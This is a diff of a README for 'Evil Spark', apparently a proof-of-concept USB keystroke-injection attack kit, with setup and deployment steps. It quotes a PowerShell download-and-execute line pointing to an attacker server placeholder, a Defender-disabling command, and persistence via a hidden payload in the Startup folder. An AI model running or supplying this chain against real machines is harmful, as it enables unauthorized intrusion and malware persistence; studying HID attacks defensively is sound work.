@@ -1,5 +1,5 @@
-# Evil Spark 
-![Evil](https://github.com/MustafaCyb/Evil-Spark/blob/main/EvilSpark.png)
+#Evil Spark 
+![Evil Spark](https://github.com/MustafaCyb/Evil-Spark/blob/main/EvilSpark.png)
 ---
 
 **⚠️ DANGER: EXTREME WARNING ⚠️**
@@ -10,8 +10,8 @@ This project is developed for **educational and research purposes ONLY**. Unauth
 ## 🚀 Project Overview
 Evil Spark demonstrates a proof-of-concept (PoC) attack chain utilizing a Digispark-compatible USB device. This device emulates keyboard actions to automate tasks on a target Windows machine, leading to the download and execution of a custom payload with persistence. This project integrates:
 * A Linux-based server setup script (`setup.sh`).
-* A Digispark sketch (`Evil_Spark.ino`) written in C++. [cite: 5]
-* A PowerShell script (`Starter.ps1`) for payload deployment and execution. [cite: 4]
+* A Digispark sketch (`Evil_Spark.ino`) written in C++. 
+* A PowerShell script (`Starter.ps1`) for payload deployment and execution. 
 
 This project is designed to help understand HID attacks, payload delivery mechanisms, and basic persistence techniques from a defensive perspective.
 
@@ -19,27 +19,28 @@ This project is designed to help understand HID attacks, payload delivery mechan
 * ✔️ Automated Keystroke Injection via Digispark (HID Attack).
 * ✔️ Apache Server Setup Script (`setup.sh`) for hosting payloads.
 * ✔️ PowerShell-based payload stager (`Starter.ps1`) for:
-    * Attempting to disable Windows Defender. [cite: 4]
-    * Downloading the main payload. [cite: 4]
-    * Executing the payload. [cite: 4]
-    * Achieving persistence via the Startup folder. [cite: 4]
+    * Attempting to disable Windows Defender. 
+    * Downloading the main payload. 
+    * Executing the payload. 
+    * Achieving persistence via the Startup folder. 
 
 ## 🔗 Workflow At a Glance
+![Workflow At a Glance](https://github.com/MustafaCyb/Evil-Spark/blob/main/Diagram.png)
 1.  **💻 Attacker Setup:**
     * The `setup.sh` script configures an Apache server on Linux to host `Starter.ps1` and the `payload.exe`.
-    * The `Evil_Spark.ino` (C++ sketch) [cite: 5] is customized with the server's IP and uploaded to the Digispark device using the Arduino IDE.
+    * The `Evil_Spark.ino` (C++ sketch) ; is customized with the server's IP and uploaded to the Digispark device using the Arduino IDE.
 2.  **🔌 Deployment:**
     * The programmed Evil Spark USB is plugged into the target Windows computer.
 3.  **🤖 Automated Execution (Digispark):**
-    * The Digispark emulates keyboard inputs. [cite: 5]
-    * It attempts to disable Windows Defender through UI manipulation. [cite: 5]
-    * It opens PowerShell (with attempted admin rights) [cite: 5] and commands it to download and execute `Starter.ps1` from the attacker's server. [cite: 5]
+    * The Digispark emulates keyboard inputs. 
+    * It attempts to disable Windows Defender through UI manipulation. 
+    * It opens PowerShell (with attempted admin rights)  and commands it to download and execute `Starter.ps1` from the attacker's server. 
 4.  **🎯 Payload Delivery & Persistence (`Starter.ps1`):**
-    * `Starter.ps1` runs on the target machine. [cite: 4]
-    * Downloads the main `payload.exe` (e.g., `ring.exe` as in the example script)[cite: 4].
-    * Saves the payload to the Windows Startup folder for persistence. [cite: 4]
-    * Hides the payload file. [cite: 4]
-    * Executes the payload. [cite: 4]
+    * `Starter.ps1` runs on the target machine. 
+    * Downloads the main `payload.exe` (e.g., `ring.exe` as in the example script).
+    * Saves the payload to the Windows Startup folder for persistence. 
+    * Hides the payload file. 
+    * Executes the payload. 
 
 ## ⚙️ Project Components
 
@@ -50,16 +51,16 @@ This project is designed to help understand HID attacks, payload delivery mechan
 * Moves `payload.exe` (or your chosen name) and `Starter.ps1` to the tools directory. [cite: 3]
 
 ### 2. `Evil_Spark.ino` (Digispark C++ Sketch)
-* Arduino C++ code for ATtiny85 based Digispark-compatible devices. [cite: 5]
-* Simulates keyboard inputs to perform the automated attack steps. [cite: 5]
+* Arduino C++ code for ATtiny85 based Digispark-compatible devices. 
+* Simulates keyboard inputs to perform the automated attack steps. 
 * **Requires Arduino IDE for compilation and upload.** (Download from: [https://www.arduino.cc/en/software/](https://www.arduino.cc/en/software/))
 
 ### 3. `Starter.ps1` (PowerShell Script)
-* PowerShell script executed on the target. [cite: 4]
-* Attempts `Set-MpPreference -DisableRealtimeMonitoring $true`. [cite: 4]
-* Downloads the main payload (e.g., `ring.exe`) to the Startup folder. [cite: 4]
-* Hides the payload using `attrib +h +s`. [cite: 4]
-* Executes the payload. [cite: 4]
+* PowerShell script executed on the target. 
+* Attempts `Set-MpPreference -DisableRealtimeMonitoring $true`. 
+* Downloads the main payload (e.g., `ring.exe`) to the Startup folder. 
+* Hides the payload using `attrib +h +s`. 
+* Executes the payload. 
 
 ### 4. `payload.exe` (Example: `ring.exe`)
 * **THIS IS THE CORE PAYLOAD YOU MUST CREATE OR PROVIDE.**
@@ -71,7 +72,7 @@ This project is designed to help understand HID attacks, payload delivery mechan
 ## 🛠️ Prerequisites & Tools
 * 🐧 A Linux machine (Debian-based recommended for `setup.sh`) for the server.
 * 🔌 Digispark ATtiny85 compatible USB board.
-* 💻 **Arduino IDE:** Used to compile the C++ sketch (`.ino`) and upload it to the Digispark. [cite: 5]
+* 💻 **Arduino IDE:** Used to compile the C++ sketch (`.ino`) and upload it to the Digispark. 
     * Download: [https://www.arduino.cc/en/software/](https://www.arduino.cc/en/software/)
 * 🎯 A Windows target machine for testing (**WITH EXPLICIT, PRIOR, WRITTEN CONSENT ONLY**).
 * 👾 Your custom `payload.exe` (e.g., `ring.exe`).
@@ -90,13 +91,13 @@ This project is designed to help understand HID attacks, payload delivery mechan
 ### 2. TARGET SCRIPT: `Starter.ps1` Configuration
 1.  Edit `Starter.ps1`.
 2.  Update the URI in `Invoke-WebRequest` to point to your payload on your server:
-    * Example: `Invoke-WebRequest -Uri "http://<YOUR_SERVER_IP>/tools/ring.exe" -OutFile $target` [cite: 4]
+    * Example: `Invoke-WebRequest -Uri "http://<YOUR_SERVER_IP>/tools/ring.exe" -OutFile $target` 
     * Replace `<YOUR_SERVER_IP>` and ensure `ring.exe` matches your payload filename.
 
 ### 3. DIGISPARK: `Evil_Spark.ino` Programming
-1.  Open `Evil_Spark.ino` (your C++ sketch for the Digispark) in the **Arduino IDE**. [cite: 5]
+1.  Open `Evil_Spark.ino` (your C++ sketch for the Digispark) in the **Arduino IDE**. 
 2.  Modify the line that fetches `Starter.ps1` to include your server's IP:
-    * Example: `DigiKeyboard.print("iex (iwr 'http://<YOUR_SERVER_IP>/tools/Starter.ps1')");` [cite: 5]
+    * Example: `DigiKeyboard.print("iex (iwr 'http://<YOUR_SERVER_IP>/tools/Starter.ps1')");` 
 3.  In Arduino IDE:
     * Ensure Digispark board drivers/support are installed.
     * Select the correct Digispark board from the Tools menu.
@@ -105,13 +106,13 @@ This project is designed to help understand HID attacks, payload delivery mechan
 ### 4. 💣 DEPLOYMENT
 1.  Ensure your Apache server is running and accessible.
 2.  Plug the programmed Evil Spark USB into the **consenting** target Windows machine.
-3.  The Digispark will emulate keystrokes and initiate the programmed sequence. [cite: 5]
+3.  The Digispark will emulate keystrokes and initiate the programmed sequence. 
 
 ## ❗ Important Considerations & Limitations
-* **UAC (User Account Control):** The `.ino` sketch attempts to handle UAC. [cite: 5] Its success varies based on target system settings.
+* **UAC (User Account Control):** The `.ino` sketch attempts to handle UAC.  Its success varies based on target system settings.
 * **Antivirus (AV) & EDR:** Basic attempts to disable Windows Defender [cite: 4, 5] are included. Modern AV/EDR solutions will likely detect and block these activities. This PoC is not designed for stealth.
 * **Keyboard Layouts:** Keystroke emulation typically assumes a US QWERTY layout. Results may vary on different layouts.
-* **Timings & Delays:** `DigiKeyboard.delay()` values in the `.ino` sketch are critical. [cite: 5] Adjust them based on target system responsiveness.
+* **Timings & Delays:** `DigiKeyboard.delay()` values in the `.ino` sketch are critical.  Adjust them based on target system responsiveness.
 * **Network Connectivity:** The target PC needs HTTP (port 80) access to your server.
 * **Payload Naming:** Ensure consistency in payload filenames across `setup.sh`, `Starter.ps1`, and your actual payload file.
 
